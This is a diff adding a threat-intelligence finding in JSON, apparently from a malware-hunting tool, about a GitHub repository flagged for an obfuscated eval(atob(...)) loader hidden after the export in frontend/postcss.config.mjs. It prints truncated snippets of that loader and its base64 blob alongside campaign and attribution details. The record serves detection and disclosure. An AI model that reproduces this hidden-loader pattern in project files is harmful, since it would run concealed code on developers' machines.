@@ -1,0 +1,68 @@
+{
+  "finding": {
+    "key": "repository:alexsander532/mvp_wain_group130",
+    "kind": "repository",
+    "family": "",
+    "id": "alexsander532/mvp_wain_group130",
+    "url": "https://github.com/Alexsander532/MVP_WAIN_Group130",
+    "registry": "github",
+    "owner": "alexsander532",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 9,
+    "detection_method": "signature_match",
+    "attribution": "DPRK (North Korea) (per OSM)",
+    "campaign_id": "GW-C-e0be6a21",
+    "rules": "obfuscation/eval-decoded; obfuscation/atob",
+    "evidence_locations": "frontend/postcss.config.mjs:9",
+    "c2_hosts": "",
+    "iocs": "frontend/postcss.config.mjs",
+    "matched_signatures": "Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm",
+    "reasons": "Shares a confirmed-malware code signature ['Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "submitted",
+    "osm_threat_id": "4f3ba979-a60d-46f9-ad04-d7cd6571aebe",
+    "first_seen": "hunt-20260620T052811Z",
+    "last_seen": "hunt-20260620T052811Z",
+    "evidence_file": "repositories/alexsander532_mvp_wain_group130.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "frontend/postcss.config.mjs",
+      "line": 9,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82"
+    },
+    {
+      "file": "frontend/postcss.config.mjs",
+      "line": 9,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "export default config;eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-82"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/alexsander532/mvp_wain_group130",
+    "version_info": "all",
+    "threat_description": "Obfuscated loader. Payload in frontend/postcss.config.mjs.\nThe eval(atob(...)) loader hidden in a project file is Contagious Interview (DPRK-attributed) tradecraft.\nCampaign GW-C-e0be6a21: one of 11 confirmed repos across 4 accounts sharing the loader stub b10bafdcfe.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: Jzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLm.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: frontend/postcss.config.mjs\n- frontend/postcss.config.mjs:9: decodes a hidden blob and executes it at load time (obfuscated loader)\n- frontend/postcss.config.mjs:9: hides code in an encoded blob that is decoded and run",
+    "publisher": "alexsander532",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "obfuscated-loader"
+    ],
+    "evidence_references": "https://github.com/alexsander532/mvp_wain_group130/blob/HEAD/frontend/postcss.config.mjs#L9",
+    "verified_iocs": "frontend/postcss.config.mjs",
+    "contributors": [],
+    "first_seen": "2026-06-20T05:28:11Z",
+    "last_seen": "2026-06-20T05:28:11Z"
+  }
+}
